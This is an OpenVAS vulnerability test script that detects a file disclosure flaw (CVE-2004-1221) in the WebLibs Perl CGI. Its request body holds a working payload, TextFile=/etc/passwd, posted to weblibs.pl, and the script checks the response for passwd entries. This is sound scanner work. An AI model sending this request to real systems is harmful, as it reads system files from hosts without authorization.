###############################################################################
# OpenVAS Vulnerability Test
# $Id: weblibs_file_inclusion.nasl 13660 2019-02-14 09:48:45Z cfischer $
#
# WebLibs File Disclosure
#
# Authors:
# Noam Rathaus
#
# Copyright:
# Copyright (C) 2004 Noam Rathaus
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

# Remote Web Server Text File Viewing Vulnerability in WebLibs 1.0
# John Bissell <monkey321_1@hotmail.com>
# 2004-12-08 05:41

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.16168");
  script_version("$Revision: 13660 $");
  script_tag(name:"last_modification", value:"$Date: 2019-02-14 10:48:45 +0100 (Thu, 14 Feb 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_cve_id("CVE-2004-1221");
  script_bugtraq_id(11848);
  script_name("WebLibs File Disclosure");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2004 Noam Rathaus");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"summary", value:"The remote host is running 'WebLibs', a CGI written in Perl.

  Due to incorrect parsing of incoming data, an attacker can
  cause the CGI to return arbitrary files as the result of the CGI.");

  script_tag(name:"qod_type", value:"remote_app");
  script_tag(name:"solution_type", value:"WillNotFix");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

useragent = http_get_user_agent();
host = http_host_name( port:port );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";
  url = dir + "/weblibs.pl";

  req = string( "POST ", url, " HTTP/1.1\r\n",
                "Host: ", host, "\r\n",
                "User-Agent: ", useragent, "\r\n",
                "Content-Type: application/x-www-form-urlencoded\r\n",
                "Content-Length: 372\r\n",
                "\r\n",
                "TextFile=%2Fetc%2Fpasswd&Adjective+%231=a&Adjective+%232=a&Adjective+%233=a&Adjective+%234=a&Adjective+%235=a&Highland+Games+such+as+Stone+Mountain=a&Man%27s+Name=a&Noun+%231=a&Noun+%232=a&Noun+%233=a&Noun+%234=a&Noun+%235=a&Noun+%236=a&Noun+%237=a&Noun+%238=a&Plural+Noun+%231=a&Plural+Noun+%232=a&Plural+Noun+%233=a&Plural+Noun+%234=a&Plural+Noun+%235=a&Woman%27s+Name=a" );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:TRUE );

  if( egrep( pattern:"root:.*:0:[01]:.*", string:res ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );